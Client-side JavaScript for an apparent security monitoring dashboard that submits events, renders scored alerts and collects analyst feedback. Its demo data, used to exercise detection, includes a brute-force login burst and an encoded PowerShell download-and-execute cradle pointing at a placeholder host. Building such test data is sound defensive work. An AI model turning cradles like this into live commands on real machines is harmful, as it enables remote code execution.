const alertList = document.querySelector("#alertList");
const statusText = document.querySelector("#apiStatus");
const eventInput = document.querySelector("#eventInput");
const demoEvent = {
  source: "vpn",
  event_type: "authentication",
  action: "login",
  outcome: "failure",
  source_ip: "198.51.100.23",
  username: "admin",
  asset: "vpn-gateway",
  geo: "Unknown"
};

eventInput.value = JSON.stringify(demoEvent, null, 2);

document.querySelector("#refreshButton").addEventListener("click", refreshDashboard);
document.querySelector("#sendEventButton").addEventListener("click", sendEvent);
document.querySelector("#loadDemoButton").addEventListener("click", sendDemoBurst);

async function refreshDashboard() {
  const response = await fetch("/api/alerts");
  const data = await response.json();
  renderDashboard(data);
}

async function sendEvent() {
  try {
    const event = JSON.parse(eventInput.value);
    statusText.textContent = "Sending event";
    const response = await fetch("/api/events", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(event)
    });
    const data = await response.json();
    renderDashboard(data);
    statusText.textContent = response.ok ? "Event accepted" : data.error || "Request failed";
  } catch (error) {
    statusText.textContent = `Invalid event: ${error.message}`;
  }
}

async function sendDemoBurst() {
  const now = new Date().toISOString();
  const burst = [];
  for (let index = 0; index < 7; index += 1) {
    burst.push({ ...demoEvent, timestamp: now });
  }
  burst.push({
    timestamp: now,
    source: "dns",
    event_type: "dns",
    action: "query",
    outcome: "success",
    source_ip: "10.10.4.22",
    domain: "secure-login-update.top",
    asset: "laptop-044"
  });
  burst.push({
    timestamp: now,
    source: "edr",
    event_type: "endpoint",
    action: "process_start",
    outcome: "success",
    source_ip: "10.10.4.22",
    username: "jsmith",
    asset: "laptop-044",
    process: "powershell.exe",
    command_line: "powershell.exe -enc SQBFAFgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAKQAghttps://example.invalid/a"
  });

  statusText.textContent = "Sending demo burst";
  const response = await fetch("/api/events", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(burst)
  });
  renderDashboard(await response.json());
  statusText.textContent = "Demo burst accepted";
}

function renderDashboard(data) {
  document.querySelector("#eventCount").textContent = data.event_count;
  document.querySelector("#alertCount").textContent = data.alert_count;
  document.querySelector("#criticalCount").textContent = data.severity_counts.critical || 0;
  document.querySelector("#highCount").textContent = data.severity_counts.high || 0;
  document.querySelector("#lastUpdated").textContent = `Updated ${new Date().toLocaleTimeString()}`;

  if (!data.alerts.length) {
    alertList.innerHTML = '<div class="empty">No alerts generated yet.</div>';
    return;
  }

  alertList.innerHTML = data.alerts.map(renderAlert).join("");
}

function renderAlert(alert) {
  const evidence = alert.evidence.map((item) => `<li>${escapeHtml(item)}</li>`).join("");
  const mitre = alert.mitre_techniques.map(escapeHtml).join(", ");
  const feedback = alert.entities.feedback_verdicts
    ? `<p><strong>Feedback:</strong> ${alert.entities.feedback_verdicts.map(escapeHtml).join(", ")}</p>`
    : "";
  return `
    <article class="alert-card">
      <div class="alert-top">
        <div>
          <h3>${escapeHtml(alert.title)}</h3>
          <div class="meta">Risk ${alert.risk_score}/100 · ${escapeHtml(alert.confidence)} confidence · ${escapeHtml(alert.category)}</div>
        </div>
        <span class="badge ${alert.severity}">${alert.severity}</span>
      </div>
      <p>${escapeHtml(alert.summary)}</p>
      <p><strong>Business impact:</strong> ${escapeHtml(alert.business_impact)}</p>
      <p><strong>Recommended action:</strong> ${escapeHtml(alert.recommendation)}</p>
      <p><strong>MITRE:</strong> ${mitre}</p>
      ${feedback}
      <ul class="evidence">${evidence}</ul>
      <div class="feedback-actions" aria-label="analyst feedback">
        <button type="button" onclick="sendFeedback('${alert.alert_id}', 'true_positive')">True Positive</button>
        <button type="button" onclick="sendFeedback('${alert.alert_id}', 'escalated')">Escalate</button>
        <button type="button" class="warning" onclick="sendFeedback('${alert.alert_id}', 'false_positive')">False Positive</button>
        <button type="button" class="warning" onclick="sendFeedback('${alert.alert_id}', 'benign')">Benign</button>
      </div>
    </article>
  `;
}

async function sendFeedback(alertId, verdict) {
  statusText.textContent = `Saving ${verdict.replaceAll("_", " ")} feedback`;
  const response = await fetch("/api/feedback", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      alert_id: alertId,
      verdict,
      analyst: "dashboard",
      note: "Dashboard feedback"
    })
  });
  const data = await response.json();
  if (!response.ok) {
    statusText.textContent = data.error || "Feedback request failed";
    return;
  }
  renderDashboard(data);
  statusText.textContent = "Feedback saved";
}

function escapeHtml(value) {
  return String(value)
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;")
    .replaceAll('"', "&quot;")
    .replaceAll("'", "&#039;");
}

refreshDashboard();
